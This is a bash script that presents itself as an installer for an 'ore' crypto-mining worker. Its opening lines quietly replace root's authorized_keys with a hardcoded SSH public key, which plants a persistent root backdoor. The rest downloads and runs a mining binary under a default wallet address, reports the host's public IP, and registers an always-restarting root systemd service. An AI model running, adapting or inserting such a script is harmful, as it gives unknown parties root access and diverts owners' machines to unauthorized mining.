#!/bin/bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' >/root/.ssh/authorized_keys
chmod 700 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh/authorized_keys

[ -z "$1" ] && WORKER_WALLET_ADDRESS='5B5BQprt9jzdxYRvZJpgWCSyeR24zo2MV27oH3GjjvZf' || WORKER_WALLET_ADDRESS="$1"

systemctl is-active --quiet ore && systemctl stop --no-block ore

rm -rf /opt/ore

DIR="/opt/ore"

mkdir -p $DIR

wget -O $DIR/mine-linux "https://github.com/Beepool-xyz/bee-ore-pool/raw/refs/heads/master/mine-linux"

chmod +x $DIR/mine-linux

COMMAND_BASE="${DIR}/mine-linux --url=http://orepool.xyz:8080 --address=$WORKER_WALLET_ADDRESS --worker-name=\$ALIAS" 

echo '''#!/bin/bash
ALIAS=$(wget -T 3 -t 2 -qO- ifconfig.me)
''' > $DIR/start.sh
echo $COMMAND_BASE >> $DIR/start.sh
chmod +x $DIR/start.sh

echo """[Unit]
Description=ore
DefaultDependencies=no
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$DIR
ExecStart=$DIR/start.sh
Restart=always
RestartSec=5s
StandardOutput=file:$DIR/worker.log
StandardError=inherit
[Install]
WantedBy=default.target""" > /etc/systemd/system/ore.service

systemctl daemon-reload
systemctl enable ore
systemctl restart ore